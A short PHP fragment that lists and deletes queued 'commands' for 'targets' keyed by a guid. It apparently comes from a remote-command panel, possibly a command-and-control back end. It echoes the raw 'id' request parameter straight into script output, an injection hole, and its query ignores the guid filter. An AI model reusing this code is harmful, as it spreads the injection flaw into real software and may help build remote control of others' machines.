	if ($_GET["A"] == "commands") {
		$rows = $db->select("get commands", "SELECT * FROM commands", array('guid' => $_GET['id']));
		$out = "";
		foreach ($rows as $row) {
			$out .= "id: {$row['id']} target: {$row['target']} command: {$row['command']}<br/>";
		}
		if (!isset($rows[0]))
			echo "com_out('no commands for {$_GET['id']}');";
		echo "com_out('$out');";
	}

	if ($_GET["A"] == "rmcmd") {
		$db->delete("remove command", "commands", array("id" => $_GET['id']));
		echo "com_out('Removed command id: {$_GET['id']}');";
	}

